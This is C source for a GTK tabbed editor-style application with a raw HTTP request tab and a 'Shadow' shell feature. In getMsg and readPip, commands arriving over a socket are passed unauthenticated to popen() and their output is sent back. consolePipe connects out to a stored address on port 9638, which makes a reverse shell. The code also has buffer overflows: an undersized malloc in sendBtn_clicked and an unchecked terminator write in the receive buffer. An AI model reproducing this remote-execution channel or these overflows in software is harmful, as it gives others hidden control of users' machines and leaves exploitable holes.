#include "DrnGtk.h"

#ifdef linux
#define path_split '/'
#else
#define path_split '\\'
#endif

#ifdef linux
void *readPip (void *sender);
#else
DWORD WINAPI readPip (LPVOID sender);
#endif
void closePip (int *s_fd);

httpRequest reqArgs;
httpResponse resArgs;
int mPort;
FILE *mPip;
u_long shd_addr;

GtkWidget *mWindow, *tabCon;

void Init (GtkApplication *JustEditor, gpointer sender);
void newfBtn_clicked (GtkWidget *newfBtn, gpointer sender);
void openfBtn_clicked (GtkWidget *openfBtn, gpointer sender);
void newrBtn_clicked (GtkWidget *newrBtn, gpointer sender);
void srvBtn_clicked (GtkWidget *openfBtn, gpointer sender);
void shdBtn_clicked (GtkWidget *openfBtn, gpointer sender);
void tabClsBtn_clicked (GtkWidget *tab);
void tabTitle_pressed (GtkWidget *evtBox, GdkEventButton *args, GtkWidget *tab);
void sendBtn_clicked(gpointer sender);
void tabPage_switched (gpointer sender, GtkWidget *pContent, int page_num);


void sendFrEntry (GtkEntry *entry, GdkEventKey *args, gpointer s_fd)
{
	if (args->keyval == GDK_KEY_Return || args->keyval == GDK_KEY_KP_Enter)
	{
		const gchar *tmp = gtk_entry_get_text (entry);
		uint s_len = strlen (tmp);
		if (s_len > 0 && send (*(int*)s_fd, tmp, strlen (tmp), 0) >= 0)
		{
			gtk_entry_set_text (entry, "");
		}
	}
}

GtkWidget *getEditor (gchar e_num)
{
	GtkWidget *tEditor, *tItem, *tIP;

	switch (e_num)
	{
	case 'R':
		tEditor = gtk_box_new (GTK_ORIENTATION_VERTICAL, 2);

		gtk_container_add (GTK_CONTAINER (tEditor), gtk_label_new ("IP Address"));
		gtk_container_add (GTK_CONTAINER (tEditor), tIP = gtk_entry_new ());
		gtk_container_add (GTK_CONTAINER (tEditor), gtk_label_new ("Header & Body"));
		gtk_container_add (GTK_CONTAINER (tEditor), gtk_text_view_new ());
		gtk_container_add (GTK_CONTAINER (tEditor), gtk_check_button_new_with_label ("Use CrLf"));
		gtk_container_add (GTK_CONTAINER (tEditor), tItem = button_template ("Send"));
		
		g_signal_connect_swapped (tItem, "clicked", G_CALLBACK (sendBtn_clicked), tEditor);

		gtk_container_add (GTK_CONTAINER (tEditor), gtk_label_new ("Response"));
		gtk_container_add (GTK_CONTAINER (tEditor), text_view_template (false));
	break;
	case 'S':
		tEditor = gtk_box_new (GTK_ORIENTATION_VERTICAL, 2);

		gtk_container_add (GTK_CONTAINER (tEditor), gtk_label_new ("Shell"));
		gtk_container_add (GTK_CONTAINER (tEditor), tItem = gtk_scrolled_window_new (NULL, NULL));
		
		gtk_box_set_child_packing (GTK_BOX (tEditor), tItem, TRUE, TRUE, 0, GTK_PACK_START);
		gtk_widget_set_valign (tItem, GTK_ALIGN_FILL);
//		gtk_widget_set_halign (tItem, GTK_ALIGN_FILL);

		
		gtk_container_add (GTK_CONTAINER (tItem), resArgs.resBox = text_view_template (false));
		g_signal_connect (resArgs.resBox, "size-allocate", G_CALLBACK (gtk_text_view_scroll_to_end), NULL);

		gtk_container_add (GTK_CONTAINER (tEditor), gtk_entry_new ());

		resArgs.hbStr = NULL;
	break;
	}

	
	return tEditor;
}


struct DrnTab tab_template (gchar *title, GtkWidget *pageCon)
{
	GtkWidget *clsBtn, *tabTitle, *content;

	struct DrnTab tabItem = {gtk_event_box_new (), title, NULL, title[0] == '&' ? getEditor (title[1]): gtk_text_view_new (), NULL};
	gtk_container_add (GTK_CONTAINER (tabItem.content), content = gtk_box_new (GTK_ORIENTATION_HORIZONTAL, 4));

	tabTitle = label_template (title, 0.01);
	gtk_container_add (GTK_CONTAINER (content), tabTitle);

	clsBtn = button_template ("x");
	g_signal_connect_swapped (clsBtn, "clicked", G_CALLBACK (tabClsBtn_clicked), pageCon);
	gtk_container_add (GTK_CONTAINER (content), clsBtn);

	g_signal_connect (tabItem.content, "button-press-event", G_CALLBACK (tabTitle_pressed), pageCon);
	gtk_widget_show_all (tabItem.content);
	return tabItem;
}

GtkWidget *a_page ()
{
	return gtk_label_new ("+");
}

void tabPage_switched (gpointer sender, GtkWidget *pContent, int page_num)
{
	if (gtk_notebook_get_n_pages (GTK_NOTEBOOK (tabCon)) == page_num + 1)
		return;

	char sel_css[128];
	sprintf (sel_css, 	"notebook tab{"
				"border:	0 none;"
				"}"
				"notebook tab:nth-child(%d){"
				"border-bottom-width:	2px;"
				"border-color:		#233;"
				"border-style:		solid;"
				"}"
			 , 2 + page_num);
	append_css (sel_css);

}

void tabTitle_pressed (GtkWidget *evtBox, GdkEventButton *args, GtkWidget *tab)
{
	if (args->button == GDK_BUTTON_MIDDLE)
		tabClsBtn_clicked (tab);
	else if (args->button == GDK_BUTTON_SECONDARY)
		g_print ("test\n");
	else
		gtk_notebook_set_current_page (GTK_NOTEBOOK (tabCon), gtk_notebook_page_num (GTK_NOTEBOOK (tabCon), tab));
}

void tabClsBtn_clicked (GtkWidget *tab)
{
	gtk_notebook_detach_tab (GTK_NOTEBOOK (tabCon), tab);
}

bool getMsg(httpResponse *thisReq, int s_fd)
{
	char *s, r_str[10240];
	int r_len;
	void *r_Box;
	if (thisReq->hbStr != NULL)
	{
		s = thisReq->hbStr;
		if (send (s_fd, s, strlen(s), 0) >= 0)
		{
			free (s);
			s = NULL;
			thisReq->hbStr = NULL;
			g_print ("sent\n");
		}
		else
			return 1;
	}
	if ((r_Box = thisReq->resBox) != NULL)
	{
		GtkTextIter r_Iter;
		GtkTextBuffer *r_Buf = gtk_text_view_get_buffer (r_Box);
		gtk_text_buffer_get_end_iter (r_Buf, &r_Iter);

		struct bufferUpdateArgs bufArgs = {r_Buf, r_Iter, r_str, -1};
		
		while ((r_len = recv (s_fd, r_str, 10240, 0)) > 0)
		{
			r_str [r_len] = '\0';
			bufArgs.r_Len = r_len;
			printf ("%s", r_str);
#ifdef _WIN32
			buffer_update (&bufArgs);
#else
			pthread_t th_id;
			pthread_create (&th_id, NULL, &buffer_update, &bufArgs);
			pthread_join (th_id, NULL);
#endif

		}
	}
	else
	{
		mPort = s_fd;
		mPip = NULL;
		onConn (readPip, NULL);
		while ((r_len = recv (s_fd, r_str, 10240, 0)) > 0)
		{
			r_str [r_len] = '\0';
			mPip = popen (r_str, "r");
		}
	}
	return 0;
}

//http response
#ifdef linux
void *httpRes (void *sender)
#else
DWORD WINAPI httpRes (LPVOID sender)
#endif
{

	g_print ("listening\n");
	int sc_fd = initSocket ();
	g_signal_connect_swapped (resArgs.resBox, "destroy", G_CALLBACK (closeSocket), (gpointer)&sc_fd);

	int s_fd = listenSocket (sc_fd, mPort);
	if (s_fd >= 0)
	{
		g_print ("connected\n");
		if (resArgs.resBox != NULL)
		{
//			g_signal_connect (resArgs.resBox, "");
			GList *tList = gtk_container_get_children (GTK_CONTAINER (gtk_widget_get_parent (gtk_widget_get_parent (resArgs.resBox))));
			gtk_label_set_text (g_list_nth_data (tList, 0), "Shell-Connected");
			g_signal_connect (g_list_nth_data (tList, 2), "key-release-event", G_CALLBACK (sendFrEntry), (gpointer)&s_fd);
			g_signal_connect_swapped (gtk_widget_get_parent (resArgs.resBox), "destroy", G_CALLBACK (closeSocket), (gpointer)&s_fd);
		}
		getMsg (&resArgs, s_fd);
	}
/*
HTTP/1.1 200 OK
Content-Type: text/html;charset=gb2312
Connection: close
*/

	closeSocket (&s_fd);
}

//http request
#ifdef linux
void *httpReq (void *sender)
#else
DWORD WINAPI httpReq (LPVOID sender)
#endif
{
	httpRequest *thisReq = &reqArgs;
	int s_fd = initSocket ();
	g_print ("connecting\n");
	if (sockConn (&s_fd, &thisReq->target_addr) != 0)
		goto failed;

	g_print ("connected\n");
	if (getMsg ((httpResponse*)thisReq, s_fd))
		goto failed;
	
	g_print ("over\n");
	closeSocket (&s_fd);
#ifdef linux
	return (void *)0;
#else
	return 0;
#endif
failed:
	g_print ("failed\n");
#ifdef linux
	return (void *)0;
#else
	return -1;
#endif
}

void sendBtn_clicked(gpointer sender)
{
	GList *tList = gtk_container_get_children (GTK_CONTAINER (sender));

	GtkTextIter st, ed;
	GtkTextBuffer *buffer = gtk_text_view_get_buffer (g_list_nth_data (tList, 3));

	gtk_text_buffer_get_start_iter (buffer, &st);
	gtk_text_buffer_get_end_iter (buffer, &ed);
	char *tmp = gtk_text_buffer_get_text (buffer, &st, &ed, FALSE);
	char *hbStr = (char *)malloc (strlen (tmp));
	hbStr [0] = '\0';
	strcpy (hbStr, tmp);
	httpRequest tReq = {gtk_toggle_button_get_mode (g_list_nth_data (tList, 4)) ? replace_str (hbStr, "\n", "\r\n", 0, true) : hbStr, (void *)g_list_nth_data (tList, 7), initAddr (gtk_entry_get_text (g_list_nth_data (tList, 1)), 80)};
	reqArgs = tReq;

	onConn (httpReq, (void *)&tReq);
}

void startServer (GtkWidget *portEntry)
{
	mPort = atoi (gtk_entry_get_text (GTK_ENTRY (portEntry)));
	onConn (httpRes, NULL);
}

void closePip (int *s_fd)
{
	closeSocket (s_fd);
	if (mPip != NULL)
		pclose (mPip);
}

#ifdef linux
void *readPip (void *sender)
#else
DWORD WINAPI readPip (LPVOID sender)
#endif
{
	int s_fd = mPort, s_st;
	FILE *pp;
	char pBuf[255];

	do
	{
		while (mPip == NULL);
		pp = mPip;
		while (fgets (pBuf ,255, pp) != NULL && pBuf[0] && (s_st = send (s_fd, pBuf, strlen (pBuf), 0)) >= 0);
		pclose (pp);
		mPip = NULL;
		send (s_fd, "\ndone\n", 7, 0);
	} while (s_st >= 0);
}

void consolePipe (void)
{
	reqArgs.target_addr = initAddr_shd (shd_addr, 9638);
	reqArgs.hbStr = NULL;
	reqArgs.resBox = NULL;
	onConn (httpReq, NULL);
}

void shdServer (GtkWidget *sender)
{
	newfBtn_clicked (NULL, (gpointer)"&Shadow");
	startServer (sender);
}
